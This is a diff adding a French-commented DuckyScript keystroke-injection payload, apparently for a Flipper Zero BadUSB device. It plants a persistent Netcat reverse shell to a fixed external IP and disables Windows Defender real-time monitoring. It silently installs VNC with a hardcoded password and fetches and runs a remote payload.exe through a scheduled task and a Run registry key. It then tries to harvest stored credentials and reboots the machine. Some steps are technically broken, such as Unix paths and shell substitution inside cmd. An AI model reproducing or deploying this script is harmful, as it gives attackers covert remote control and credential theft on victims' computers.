@@ -1,0 +1,163 @@
+REM Début du script
+REM -----------------------------------------
+REM Création d'une backdoor persistante avec Netcat
+REM -----------------------------------------
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING echo OFF > %TEMP%\backdoor.bat
+ENTER
+STRING echo nc -e cmd.exe 37.8.189.89 4444 >> %TEMP%\backdoor.bat
+ENTER
+STRING schtasks /create /tn "PersistentBackdoor" /tr "%TEMP%\backdoor.bat" /sc onstart
+ENTER
+
+REM -----------------------------------------
+REM Désactiver l'antivirus (pour éviter interruptions)
+REM -----------------------------------------
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+
+REM -----------------------------------------
+REM Télécharger et installer VNC
+REM -----------------------------------------
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING powershell -Command Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1KEqR-JWkJ20g38ovdGkMi8VXo4dV1h66" -OutFile "%TEMP%\VNCSetup.exe"
+ENTER
+STRING Start-Process "%TEMP%\VNCSetup.exe" -ArgumentList "/S" -Wait
+ENTER
+
+REM -----------------------------------------
+REM Créer un mot de passe pour VNC
+REM -----------------------------------------
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING reg add "HKCU\Software\RealVNC\vncserver" /v "Password" /t REG_SZ /d "VNC_Password123" /f
+ENTER
+
+REM -----------------------------------------
+REM Ajouter une tâche planifiée pour l'exécution du script au démarrage
+REM -----------------------------------------
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING schtasks /create /tn "AutoRunScript" /tr "powershell.exe -NoProfile -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://github.com/olivexiv/Payload/raw/main/payload.exe' -OutFile '%TEMP%\\payload.exe'; Start-Process '%TEMP%\\payload.exe'" /sc onstart
+ENTER
+
+REM -----------------------------------------
+REM Ajouter une clé au Registre pour exécution au démarrage
+REM -----------------------------------------
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousScript" /t REG_SZ /d "powershell.exe -NoProfile -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://github.com/olivexiv/Payload/raw/main/payload.exe' -OutFile '%TEMP%\\payload.exe'; Start-Process '%TEMP%\\payload.exe'"
+ENTER
+
+REM -----------------------------------------
+REM Récupérer des mots de passe enregistrés (gestionnaire d'accès Windows)
+REM -----------------------------------------
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING rundll32.exe keymgr.dll,KRShowKeyMgr
+ENTER
+
+REM -----------------------------------------
+REM Activer un shell inversé avec Netcat
+REM -----------------------------------------
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING nc -e cmd.exe 37.8.189.89 4444
+ENTER
+
+REM -----------------------------------------
+REM Télécharger et exécuter un fichier malveillant depuis un serveur distant
+REM -----------------------------------------
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 500
+STRING Invoke-WebRequest -Uri "https://github.com/olivexiv/Payload/raw/main/payload.exe" -OutFile "$env:temp\payload.exe"
+ENTER
+STRING Start-Process "$env:temp\payload.exe"
+ENTER
+
+REM -----------------------------------------
+REM Enregistrer les informations sur la carte SD du Flipper
+REM -----------------------------------------
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING echo "Collecting Information..." > /mnt/sdcard/info.txt
+ENTER
+STRING echo "IP Address: 37.8.189.89" >> /mnt/sdcard/info.txt
+ENTER
+STRING echo "Captured Passwords: $(rundll32.exe keymgr.dll,KRShowKeyMgr)" >> /mnt/sdcard/info.txt
+ENTER
+
+REM -----------------------------------------
+REM Enregistrer les informations sur la machine cible
+REM -----------------------------------------
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING echo "Collecting Information..." > %TEMP%\info.txt
+ENTER
+STRING echo "IP Address: 37.8.189.89" >> %TEMP%\info.txt
+ENTER
+STRING echo "Captured Passwords: $(rundll32.exe keymgr.dll,KRShowKeyMgr)" >> %TEMP%\info.txt
+ENTER
+
+REM -----------------------------------------
+REM Redémarrer la machine cible
+REM -----------------------------------------
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING shutdown /r /t 0
+ENTER
+
+REM Fin du script
+REM -----------------------------------------
